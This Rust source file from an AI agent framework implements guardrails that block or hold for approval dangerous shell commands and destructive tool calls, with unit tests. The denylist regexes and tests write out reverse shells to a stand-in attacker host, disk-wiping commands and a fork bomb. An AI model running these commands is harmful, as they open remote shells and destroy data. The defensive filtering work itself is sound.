use crate::config::{ErrorDetailLevel, HooksConfig};
use ironhermes_core::DangerousCommandsConfig;
use ironhermes_core::McpMutationGuardrailConfig;
use regex::Regex;

/// The outcome of a guardrail check on a tool call.
#[derive(Debug, Clone, PartialEq)]
pub enum GuardrailDecision {
    /// Allow the tool call to proceed.
    Allow,
    /// Log a warning and emit a hook event, but allow the call to proceed.
    Warn { reason: String },
    /// Block the tool call. The reason is returned to the agent as an error.
    Block { reason: String },
    /// Park the tool call pending async approval from the operator chat (D-11).
    ///
    /// Distinct from [`GuardrailDecision::Warn`] — the call does NOT proceed; it is held
    /// until the operator sends `/approve` or `/deny` (or the gate times out).
    /// Only bypassed once the gate resolves to `Approved`; all other outcomes are
    /// fail-closed (D-11, T-45-05).
    NeedsApproval { reason: String },
}

/// A guardrail hook that can intercept tool calls before dispatch.
///
/// Implementations inspect the tool name and arguments and return a decision.
/// This method is synchronous — no I/O should be performed here.
pub trait GuardrailHook: Send + Sync {
    /// Inspect a tool call and decide whether to allow, warn, or block.
    fn check(&self, tool_name: &str, args: &serde_json::Value) -> GuardrailDecision;

    /// Human-readable name for this guardrail (used in log messages).
    fn name(&self) -> &str;
}

/// Config-driven blocklist guardrail: blocks tools by name.
///
/// Per D-05: registered first in the guardrail chain so blocked tools are
/// rejected before any custom trait-based guardrails run.
pub struct BlocklistGuardrail {
    blocked_tools: Vec<String>,
}

impl BlocklistGuardrail {
    /// Create a blocklist guardrail from an explicit list of tool names.
    pub fn new(blocked_tools: Vec<String>) -> Self {
        Self { blocked_tools }
    }

    /// Create a blocklist guardrail from the `blocked_tools` field in `HooksConfig`.
    pub fn from_config(config: &HooksConfig) -> Self {
        Self::new(config.blocked_tools.clone())
    }
}

impl GuardrailHook for BlocklistGuardrail {
    fn check(&self, tool_name: &str, _args: &serde_json::Value) -> GuardrailDecision {
        if self.blocked_tools.iter().any(|b| b == tool_name) {
            GuardrailDecision::Block {
                reason: format!("tool '{}' is on the blocklist", tool_name),
            }
        } else {
            GuardrailDecision::Allow
        }
    }

    fn name(&self) -> &str {
        "blocklist"
    }
}

/// Format the error message returned to the agent when a tool call is blocked.
///
/// Per D-06: `ErrorDetailLevel::Full` includes the tool name and reason for
/// developer convenience; `ErrorDetailLevel::Minimal` returns a generic message
/// for high-security deployments where leaking tool names is undesirable (T-06-05).
pub fn format_guardrail_error(
    tool_name: &str,
    reason: &str,
    guardrail_name: &str,
    detail_level: &ErrorDetailLevel,
) -> String {
    match detail_level {
        ErrorDetailLevel::Full => {
            format!(
                "Tool '{}' blocked by guardrail '{}': {}",
                tool_name, guardrail_name, reason
            )
        }
        ErrorDetailLevel::Minimal => "Tool call blocked by security policy".to_string(),
    }
}

// ---------------------------------------------------------------------------
// DangerousCommandGuardrail — two-tier dangerous-command denylist (EXEC-02)
// ---------------------------------------------------------------------------

/// Classification tier for a dangerous-command pattern.
///
/// - [`Tier::Two`]: catastrophic ops — hard-block, no prompt, no subprocess (D-07, D-03).
/// - [`Tier::One`]: network/exfil/eval — approval-required; yolo bypasses Tier-1 only (D-08, D-13).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tier {
    /// Tier-1: approval-required (network tools, eval/exec, pipe-to-shell, reverse-shell
    /// redirects, full-path dangerous binaries).
    One,
    /// Tier-2: hard-block — catastrophic destructive ops (`rm -rf /`, `dd`, `mkfs`, fork
    /// bomb, block-device redirects). D-03: check() returns Block immediately; no code path
    /// may reach an approval prompt or subprocess after a Tier-2 match.
    Two,
}

/// Built-in denylist patterns for the dangerous-command guardrail (EXEC-02).
///
/// All patterns use the negative-character-class boundary prefix/suffix:
/// `(?:(?:^|[^a-zA-Z0-9_]))WORD(?:[^a-zA-Z0-9_]|$)`.
///
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as a literal
/// backslash-b, NOT a word boundary. The regression test `regex_no_word_boundary`
/// asserts zero patterns contain this two-character sequence (EXEC-02).
///
/// Tier-2 → [`GuardrailDecision::Block`] (D-03 — never approvable).
/// Tier-1 → [`GuardrailDecision::Warn`] (approval-required; yolo bypasses Tier-1 only, D-13).
pub const DANGEROUS_PATTERNS: &[(&str, Tier)] = &[
    // ── Tier-2: catastrophic / hard-block (D-07) ─────────────────────────
    // rm with combined short flags: -r/-R/-f/-F in any single-flag or two-flag
    // combination (e.g. -rf, -Rf, -rF, -RF, -fr, -Fr) followed by an absolute path.
    // CR-01: uppercase -R/-F aliases were missing from the original [rf]{1,2} class.
    (r"(?:(?:^|[^a-zA-Z0-9_/]))rm\s+-[rRfF]{1,2}\s+/", Tier::Two),
    // rm with separate short flags (e.g. rm -r -f / or rm -f -r /).
    // CR-01: separate-flag form was not matched by the combined-flag pattern above.
    (
        r"(?:(?:^|[^a-zA-Z0-9_/]))rm\s+-[rRfF]\s+-[rRfF]\s+/",
        Tier::Two,
    ),
    // rm with long-form flags --recursive / --force (any order, one or both)
    // followed by an absolute path (e.g. rm --recursive --force / or rm --recursive /var).
    // CR-01: long-form flags were not covered by any previous pattern.
    (
        r"(?:(?:^|[^a-zA-Z0-9_/]))rm(?:\s+--(?:recursive|force))+\s+/",
        Tier::Two,
    ),
    // dd writing to a raw block device
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))dd\s+(?:\S+\s+)*of=/dev/(?:sd[a-z]|hd[a-z]|nvme\d|disk\d)",
        Tier::Two,
    ),
    // mkfs — formats a filesystem
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))mkfs(?:\.[a-zA-Z0-9]+)?(?:[^a-zA-Z0-9_]|$)",
        Tier::Two,
    ),
    // fork bomb: :(){ :|:& };:
    (r":\s*\(\s*\)\s*\{", Tier::Two),
    // redirect to block device (> /dev/sda etc.)
    (r">\s*/dev/(?:sd[a-z]|hd[a-z]|nvme\d|disk\d)", Tier::Two),
    // ── Tier-1: network / exfil / eval — approval required (D-08) ─────────
    // curl
    (r"(?:(?:^|[^a-zA-Z0-9_]))curl(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // wget
    (r"(?:(?:^|[^a-zA-Z0-9_]))wget(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // nc / ncat / netcat
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))n(?:c|cat|etcat)(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // socat
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))socat(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // ssh (all variants, including -R reverse tunnels)
    (r"(?:(?:^|[^a-zA-Z0-9_]))ssh(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // ngrok
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))ngrok(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // pipe to shell (| sh, | bash, | zsh, etc.)
    (r"\|\s*(?:sh|bash|zsh|fish|ksh|csh)(?:\s|;|$)", Tier::One),
    // eval shell builtin
    (r"(?:(?:^|[^a-zA-Z0-9_]))eval(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // exec shell builtin
    (r"(?:(?:^|[^a-zA-Z0-9_]))exec(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // reverse-shell redirect to /dev/tcp/ or /dev/udp/
    (r">\s*&?\s*/dev/(?:tcp|udp)/", Tier::One),
    // /bin/rm — full-path dangerous binary
    (r"/bin/rm(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // /usr/bin/dd — full-path dangerous binary
    (r"/usr/bin/dd(?:[^a-zA-Z0-9_]|$)", Tier::One),
];

/// Two-tier dangerous-command guardrail (EXEC-02).
///
/// Classifies shell command strings before dispatch:
/// - **Tier-2** (catastrophic) → [`GuardrailDecision::Block`] — D-03: returned
///   immediately, before any approval-cache lookup or subprocess spawn.
/// - **Tier-1** (network/exfil/eval) → [`GuardrailDecision::Warn`] — approval required.
/// - **Shell metachar** (D-09) → [`GuardrailDecision::Warn`] — string-level matching
///   cannot safely classify commands with `$(`, `` ` ``, `;`, `|`, `&&`, `${IFS}`,
///   `$'…'`, or `\x` sequences; approval is required, NOT a hard block (legitimate
///   pipes like `ps aux | grep x` must remain runnable behind approval).
/// - **Safe commands** → [`GuardrailDecision::Allow`].
///
/// This is a speed-bump, not the security boundary (that is EXEC-03 env sanitization
/// and the approval gate). The hard invariants are D-03 (Tier-2 never approvable) and
/// D-13 (yolo never overrides Tier-2). `check()` has no yolo input — Block is returned
/// before any caller-side yolo bypass can apply.
pub struct DangerousCommandGuardrail {
    tier1: Vec<Regex>,
    tier2: Vec<Regex>,
}

impl DangerousCommandGuardrail {
    /// Create a guardrail with the built-in [`DANGEROUS_PATTERNS`] compiled once.
    pub fn new() -> Self {
        let mut tier1 = Vec::new();
        let mut tier2 = Vec::new();
        for (pattern, tier) in DANGEROUS_PATTERNS {
            // Built-in patterns are compile-time constants validated by the
            // `regex_no_word_boundary` regression test. Panic on compile failure is
            // appropriate here — a bad built-in is a code defect, not a runtime error.
            let regex = Regex::new(pattern).unwrap_or_else(|e| {
                panic!("DangerousCommandGuardrail: invalid built-in pattern '{pattern}': {e}")
            });
            match tier {
                Tier::One => tier1.push(regex),
                Tier::Two => tier2.push(regex),
            }
        }
        Self { tier1, tier2 }
    }

    /// Create a guardrail from operator config — adds/relaxes built-in patterns (D-10).
    pub fn from_config(config: &DangerousCommandsConfig) -> Self {
        let mut guard = Self::new();
        guard.apply_config_overrides(config);
        guard
    }

    /// Apply operator overrides: add custom patterns at either tier and relax
    /// (remove) built-in patterns by their exact pattern string.
    ///
    /// Per D-10: every entry in `config.relax` emits a `tracing::warn!` so the
    /// security floor is never silently weakened — even if the entry does not match
    /// any built-in (which may indicate a typo in the operator config).
    fn apply_config_overrides(&mut self, config: &DangerousCommandsConfig) {
        // Add operator-provided Tier-1 patterns.
        for pattern in &config.add_tier1 {
            match Regex::new(pattern) {
                Ok(r) => self.tier1.push(r),
                Err(e) => tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    pattern = %pattern,
                    error = %e,
                    "add_tier1 pattern failed to compile — skipped"
                ),
            }
        }
        // Add operator-provided Tier-2 patterns.
        for pattern in &config.add_tier2 {
            match Regex::new(pattern) {
                Ok(r) => self.tier2.push(r),
                Err(e) => tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    pattern = %pattern,
                    error = %e,
                    "add_tier2 pattern failed to compile — skipped"
                ),
            }
        }
        // Relax (remove) built-in patterns by exact pattern-string match (D-10).
        for p in &config.relax {
            tracing::warn!(
                target: "ironhermes::security::guardrail",
                pattern = %p,
                "built-in pattern RELAXED by operator config; weakens the security floor"
            );
            self.tier1.retain(|r| r.as_str() != p.as_str());
            self.tier2.retain(|r| r.as_str() != p.as_str());
        }
    }

    /// Returns `true` if `command` contains shell metacharacters that prevent safe
    /// string-level pattern matching (D-09).
    ///
    /// Detected metachar set: command substitution `$(`, backtick `` ` ``, `;`,
    /// `|`, `&&`, `${` (parameter/IFS substitution), `$'` (ANSI-C quoting such as
    /// `$'\x72\x6d'` = `rm`), and `\x` (hex escape in shell strings).
    ///
    /// Metachar presence forces Tier-1 **Warn**, NOT Block — hard-blocking all pipes
    /// would prevent legitimate `ps aux | grep x` from ever running.
    fn has_metachar(&self, command: &str) -> bool {
        command.contains("$(")        // command substitution
            || command.contains('`')  // backtick command substitution
            || command.contains(';')  // command separator
            || command.contains('|')  // pipe
            || command.contains('&')  // background operator AND && (subsumes explicit && check — WR-01)
            || command.contains("${") // parameter / ${IFS} substitution
            || command.contains("$'") // ANSI-C quoting ($'\x72\x6d' = rm)
            || command.contains(r"\x") // hex escape in shell string
    }
}

impl Default for DangerousCommandGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for DangerousCommandGuardrail {
    /// Classify a command string before dispatch.
    ///
    /// **Check order — do not reorder (hard invariant):**
    /// 1. Tier-2 → [`GuardrailDecision::Block`] (D-03: short-circuits before any other
    ///    branch; no code path may reach approval or subprocess after a Tier-2 match).
    /// 2. Tier-1 OR metachar → [`GuardrailDecision::Warn`] (approval required).
    /// 3. [`GuardrailDecision::Allow`].
    ///
    /// `check()` accepts no yolo parameter — Block is returned before any caller-side
    /// yolo bypass applies (D-13). This method is synchronous and performs no I/O.
    fn check(&self, _tool_name: &str, args: &serde_json::Value) -> GuardrailDecision {
        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(c) => c,
            None => return GuardrailDecision::Allow,
        };

        // ── Step 1: Tier-2 hard-block (D-03) ─────────────────────────────
        // This branch MUST execute before any other decision. Tier-2 is never
        // approvable regardless of pre-seeded approvals or --yolo.
        for regex in &self.tier2 {
            if regex.is_match(command) {
                return GuardrailDecision::Block {
                    reason: format!(
                        "command matches catastrophic Tier-2 denylist pattern — \
                         hard-blocked, not approvable (D-03): {}",
                        regex.as_str()
                    ),
                };
            }
        }

        // ── Step 2: Tier-1 check (network / exfil / eval / pipe-to-shell) ─
        for regex in &self.tier1 {
            if regex.is_match(command) {
                return GuardrailDecision::Warn {
                    reason: format!(
                        "command matches Tier-1 denylist pattern — approval required: {}",
                        regex.as_str()
                    ),
                };
            }
        }

        // ── Step 2b: Shell metachar detection (D-09) ──────────────────────
        // Forces Tier-1 approval (Warn), NOT Block. Legitimate pipes must remain
        // runnable behind the approval gate.
        if self.has_metachar(command) {
            return GuardrailDecision::Warn {
                reason: "command contains shell metacharacters — string-level matching \
                         cannot verify safety; approval required (D-09)"
                    .to_string(),
            };
        }

        // ── Step 3: Allow ─────────────────────────────────────────────────
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "dangerous-command"
    }
}

// ---------------------------------------------------------------------------
// McpMutationGuardrail — intercepts destructive verbs on prefixed MCP tools (EXEC-05)
// ---------------------------------------------------------------------------

/// Default destructive verb set for [`McpMutationGuardrail`] (D-08).
///
/// Operator config can full-override this list via `mcp_mutation_guardrail.patterns`.
/// Any DEFAULT_VERB absent from the override set triggers a startup `tracing::warn!` (D-10).
///
/// Patterns use `(?:^|[^a-zA-Z0-9])verb(?:[^a-zA-Z0-9]|$)` — underscore is treated as
/// a snake_case separator so `_delete` and `delete_` both trigger. `nodelete` does NOT.
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as two literal chars, not a
/// word-boundary assertion. The regression test `regex_no_word_boundary` (EXEC-05-d) asserts
/// no pattern contains this sequence.
pub const DEFAULT_VERBS: &[&str] = &[
    "delete", "remove", "purge", "wipe", "destroy", "put", "patch",
];

/// Guardrail that intercepts destructive-verb tool calls on prefixed MCP tool names.
///
/// **Only** fires when the tool name contains `__` (the MCP server prefix convention, e.g.
/// `cloudflare_bindings__kv_bulk_delete`). Local tools (e.g. `terminal`, `read_file`) always
/// receive `Allow` (D-08).
///
/// Returns [`GuardrailDecision::NeedsApproval`] — the async approval signal. The agent loop
/// (plan 04) parks the call pending `/approve` or `/deny` from the operator (D-11).
pub struct McpMutationGuardrail {
    patterns: Vec<Regex>,
}

impl McpMutationGuardrail {
    /// Create a guardrail with the built-in [`DEFAULT_VERBS`] compiled once.
    pub fn new() -> Self {
        Self::from_verbs(DEFAULT_VERBS)
    }

    /// Build patterns from a slice of verb strings.
    ///
    /// Each verb produces `(?:^|[^a-zA-Z0-9])verb(?:[^a-zA-Z0-9]|$)`. Underscore acts as a
    /// word separator (snake_case), so `_delete` and `delete_` trigger; `nodelete` does not.
    /// NEVER `\b` — two literal chars in the Rust regex crate.
    fn from_verbs(verbs: &[&str]) -> Self {
        let patterns = verbs
            .iter()
            .map(|v| {
                let pat = format!("(?:^|[^a-zA-Z0-9]){}(?:[^a-zA-Z0-9]|$)", regex::escape(v));
                Regex::new(&pat).unwrap_or_else(|e| {
                    panic!("McpMutationGuardrail: invalid pattern for verb '{v}': {e}")
                })
            })
            .collect();
        Self { patterns }
    }

    /// Create from operator config (D-10).
    ///
    /// When `config.patterns` is non-empty it full-overrides [`DEFAULT_VERBS`]. Every built-in
    /// verb absent from the operator set emits `tracing::warn!` so the floor is never silently
    /// weakened.
    pub fn from_config(config: &McpMutationGuardrailConfig) -> Self {
        if config.patterns.is_empty() {
            return Self::new();
        }
        for &verb in DEFAULT_VERBS {
            if !config.patterns.iter().any(|p| p == verb) {
                tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    verb = %verb,
                    "built-in MCP mutation verb REMOVED by operator config; weakens the security floor"
                );
            }
        }
        let verbs: Vec<&str> = config.patterns.iter().map(|s| s.as_str()).collect();
        Self::from_verbs(&verbs)
    }
}

impl Default for McpMutationGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for McpMutationGuardrail {
    /// Classify an MCP tool call before dispatch.
    ///
    /// - Local tool (no `__` in name) → [`GuardrailDecision::Allow`].
    /// - Prefixed MCP tool without a destructive verb → [`GuardrailDecision::Allow`].
    /// - Prefixed MCP tool with a destructive verb → [`GuardrailDecision::NeedsApproval`] (D-11).
    fn check(&self, tool_name: &str, _args: &serde_json::Value) -> GuardrailDecision {
        // D-08: only intercept prefixed MCP tool names (contain `__`).
        if !tool_name.contains("__") {
            return GuardrailDecision::Allow;
        }
        // LO-02 fix: match against the WHOLE remainder after the FIRST `__`, not just
        // the final `__` segment. `rsplit("__").next()` inspected only the last
        // segment, so a destructive verb in a non-final segment
        // (e.g. "srv__delete__wrapper" → checked only "wrapper") was missed. MCP
        // convention is single-`__` `server__tool`, so for the common case this is
        // identical; the change closes the multi-`__` evasion edge.
        // e.g. "cloudflare_bindings__kv_bulk_delete" → "kv_bulk_delete"
        //      "srv__delete__wrapper"                → "delete__wrapper"
        let tool_part = tool_name.split_once("__").map(|x| x.1).unwrap_or(tool_name);
        for pattern in &self.patterns {
            if pattern.is_match(tool_part) {
                return GuardrailDecision::NeedsApproval {
                    reason: format!(
                        "MCP tool '{}' contains a destructive verb — approval required before execution",
                        tool_name
                    ),
                };
            }
        }
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "mcp-mutation"
    }
}

// ---------------------------------------------------------------------------
// Tests — DangerousCommandGuardrail (RED phase — types not yet defined above)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod dangerous_tests {
    use super::{DangerousCommandGuardrail, GuardrailDecision, GuardrailHook};

    fn cmd(s: &str) -> serde_json::Value {
        serde_json::json!({ "command": s })
    }

    // ── Tier-2: catastrophic / hard-block (D-07) ─────────────────────────

    #[test]
    fn tier2_blocks_rm_rf_root() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("rm -rf /")),
                GuardrailDecision::Block { .. }
            ),
            "rm -rf / must Block"
        );
    }

    /// CR-01 regression: uppercase flags (-R/-F), separate flags (-r -f /),
    /// and long-form flags (--recursive / --force) must all Block.
    /// Also asserts that benign commands are NOT blocked.
    #[test]
    fn tier2_blocks_rm_recursive_variants() {
        let g = DangerousCommandGuardrail::new();
        let must_block = [
            // existing — must still Block
            "rm -rf /",
            "rm -fr /",
            // uppercase aliases (CR-01 fix)
            "rm -Rf /",
            "rm -rF /",
            "rm -RF /",
            // separate short flags (CR-01 fix)
            "rm -r -f /",
            "rm -f -r /",
            // long forms (CR-01 fix)
            "rm --recursive --force /",
            "rm --force --recursive /",
            // subpaths must also Block (scope preservation)
            "rm -Rf /etc",
            "rm --recursive /var",
        ];
        for command in &must_block {
            assert!(
                matches!(
                    g.check("terminal", &cmd(command)),
                    GuardrailDecision::Block { .. }
                ),
                "expected Block for: {command}"
            );
        }
        // Benign commands must NOT Block
        assert_eq!(
            g.check("terminal", &cmd("rm file.txt")),
            GuardrailDecision::Allow,
            "rm file.txt must Allow (no recursive flag, no absolute path)"
        );
        assert_eq!(
            g.check("terminal", &cmd("ls /")),
            GuardrailDecision::Allow,
            "ls / must Allow"
        );
    }

    #[test]
    fn tier2_blocks_dd_to_block_device() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("dd if=/dev/zero of=/dev/sda")),
                GuardrailDecision::Block { .. }
            ),
            "dd if=... of=/dev/sda must Block"
        );
    }

    #[test]
    fn tier2_blocks_mkfs() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("mkfs.ext4 /dev/sdb")),
                GuardrailDecision::Block { .. }
            ),
            "mkfs must Block"
        );
    }

    #[test]
    fn tier2_blocks_fork_bomb() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd(":(){ :|:& };:")),
                GuardrailDecision::Block { .. }
            ),
            "fork bomb must Block"
        );
    }

    #[test]
    fn tier2_blocks_redirect_to_block_device() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("> /dev/sda")),
                GuardrailDecision::Block { .. }
            ),
            "> /dev/sda must Block"
        );
    }

    // ── Tier-1: network / exfil / eval — approval required (D-08) ─────────

    #[test]
    fn tier1_warns_curl() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("curl https://x")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_wget() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("wget http://example.com")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_nc() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("nc -e /bin/sh attacker.com 4444")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_socat() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check(
                "terminal",
                &cmd("socat TCP-CONNECT:attacker.com:4444 EXEC:/bin/sh")
            ),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_ssh_r() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("ssh -R 4444:localhost:22 attacker.com")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_ngrok() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("ngrok http 3000")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_pipe_to_shell() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("cat x | sh")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_eval() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd(r#"eval "$X""#)),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_reverse_shell_redirect() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("cmd >& /dev/tcp/attacker.com/4444")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_full_path_bin_rm() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("/bin/rm file")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_full_path_usr_bin_dd() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("/usr/bin/dd if=/dev/zero of=output")),
            GuardrailDecision::Warn { .. }
        ));
    }

    // ── Metachar (D-09): forces Warn, NEVER Block ─────────────────────────

    #[test]
    fn metachar_pipe_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("ps aux | grep x"));
        assert!(
            matches!(d, GuardrailDecision::Warn { .. }),
            "pipe must Warn"
        );
        assert!(
            !matches!(d, GuardrailDecision::Block { .. }),
            "pipe must NOT Block"
        );
    }

    #[test]
    fn metachar_command_substitution_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("echo $(whoami)"));
        assert!(matches!(d, GuardrailDecision::Warn { .. }));
        assert!(!matches!(d, GuardrailDecision::Block { .. }));
    }

    /// WR-01 regression: bare `&` (background operator) must Warn, not Allow.
    /// `contains('&')` subsumes `&&` so both forms are covered.
    #[test]
    fn metachar_ampersand_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        // bare & with an otherwise-unlisted tool must Warn (metachar, not Tier-1 or Tier-2)
        let d = g.check("terminal", &cmd("ls & unlisted_tool_xyz"));
        assert!(
            matches!(d, GuardrailDecision::Warn { .. }),
            "bare & must Warn (WR-01), got: {d:?}"
        );
        assert!(
            !matches!(d, GuardrailDecision::Block { .. }),
            "bare & must NOT Block"
        );
        // && (conditional-and) also covered by contains('&')
        let d2 = g.check("terminal", &cmd("echo a && echo b"));
        assert!(
            matches!(d2, GuardrailDecision::Warn { .. }),
            "&& must Warn, got: {d2:?}"
        );
    }

    #[test]
    fn metachar_semicolon_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("a; b"));
        assert!(matches!(d, GuardrailDecision::Warn { .. }));
        assert!(!matches!(d, GuardrailDecision::Block { .. }));
    }

    // ── Safe commands → Allow ─────────────────────────────────────────────

    #[test]
    fn safe_ls_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &cmd("ls -la")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn safe_cat_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &cmd("cat file.txt")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn no_command_arg_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &serde_json::json!({"other": "arg"})),
            GuardrailDecision::Allow
        );
    }

    // ── D-10: operator config overrides ───────────────────────────────────

    #[test]
    fn config_add_tier2_blocks_custom_pattern() {
        use ironhermes_core::DangerousCommandsConfig;
        let config = DangerousCommandsConfig {
            add_tier2: vec!["FORBIDDEN_CMD".to_string()],
            ..Default::default()
        };
        let g = DangerousCommandGuardrail::from_config(&config);
        assert!(matches!(
            g.check("terminal", &cmd("FORBIDDEN_CMD --dangerous")),
            GuardrailDecision::Block { .. }
        ));
        assert_eq!(
            g.check("terminal", &cmd("ls -la")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn config_relax_removes_builtin_curl() {
        use ironhermes_core::DangerousCommandsConfig;
        // Exact pattern string from DANGEROUS_PATTERNS for curl
        let curl_pat = r"(?:(?:^|[^a-zA-Z0-9_]))curl(?:[^a-zA-Z0-9_]|$)";
        let config = DangerousCommandsConfig {
            relax: vec![curl_pat.to_string()],
            ..Default::default()
        };
        let g = DangerousCommandGuardrail::from_config(&config);
        // After relaxing, curl (which has no metachar) should be Allow.
        // tracing::warn is emitted inside apply_config_overrides (D-10) — verified
        // by code inspection since inline tests cannot capture tracing spans without
        // a subscriber setup.
        assert_eq!(
            g.check("terminal", &cmd("curl https://example.com")),
            GuardrailDecision::Allow
        );
    }
}

// ---------------------------------------------------------------------------
// Tests — BlocklistGuardrail + utilities (existing)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ErrorDetailLevel;

    fn json_null() -> serde_json::Value {
        serde_json::Value::Null
    }

    #[test]
    fn test_blocklist_blocks_named_tool() {
        let guardrail = BlocklistGuardrail::new(vec!["terminal".to_string()]);
        let decision = guardrail.check("terminal", &json_null());
        assert!(
            matches!(decision, GuardrailDecision::Block { .. }),
            "expected Block, got {decision:?}"
        );
    }

    #[test]
    fn test_blocklist_allows_unlisted_tool() {
        let guardrail = BlocklistGuardrail::new(vec!["terminal".to_string()]);
        let decision = guardrail.check("read_file", &json_null());
        assert_eq!(decision, GuardrailDecision::Allow);
    }

    #[test]
    fn test_blocklist_empty_allows_all() {
        let guardrail = BlocklistGuardrail::new(vec![]);
        assert_eq!(
            guardrail.check("terminal", &json_null()),
            GuardrailDecision::Allow
        );
        assert_eq!(
            guardrail.check("write_file", &json_null()),
            GuardrailDecision::Allow
        );
        assert_eq!(
            guardrail.check("any_tool", &json_null()),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn test_format_guardrail_error_full() {
        let msg = format_guardrail_error(
            "terminal",
            "on the blocklist",
            "blocklist",
            &ErrorDetailLevel::Full,
        );
        assert!(
            msg.contains("terminal"),
            "expected tool name in full message: {msg}"
        );
        assert!(
            msg.contains("on the blocklist"),
            "expected reason in full message: {msg}"
        );
        assert!(
            msg.contains("blocklist"),
            "expected guardrail name in full message: {msg}"
        );
    }

    #[test]
    fn test_format_guardrail_error_minimal() {
        let msg = format_guardrail_error(
            "terminal",
            "on the blocklist",
            "blocklist",
            &ErrorDetailLevel::Minimal,
        );
        assert_eq!(msg, "Tool call blocked by security policy");
        assert!(
            !msg.contains("terminal"),
            "tool name must not appear in minimal message: {msg}"
        );
    }

    #[test]
    fn test_guardrail_decision_warn() {
        let warn = GuardrailDecision::Warn {
            reason: "suspicious args".to_string(),
        };
        assert!(!matches!(warn, GuardrailDecision::Block { .. }));
        assert!(!matches!(warn, GuardrailDecision::Allow));
        assert!(matches!(warn, GuardrailDecision::Warn { .. }));
    }

    #[test]
    fn test_blocklist_from_config() {
        let config = HooksConfig {
            blocked_tools: vec!["terminal".to_string(), "write_file".to_string()],
            ..HooksConfig::default()
        };
        let guardrail = BlocklistGuardrail::from_config(&config);
        assert!(matches!(
            guardrail.check("terminal", &json_null()),
            GuardrailDecision::Block { .. }
        ));
        assert!(matches!(
            guardrail.check("write_file", &json_null()),
            GuardrailDecision::Block { .. }
        ));
        assert_eq!(
            guardrail.check("read_file", &json_null()),
            GuardrailDecision::Allow
        );
    }
}

/// Guardrail that intercepts LLM-issued `terminal` tool calls running
/// `wrangler deploy` or `wrangler delete`.
///
/// Phase 46 D-06: today an LLM-issued `wrangler deploy`/`wrangler delete` executes with
/// no approval prompt and no audit entry — `DangerousCommandGuardrail`'s `Warn` decision
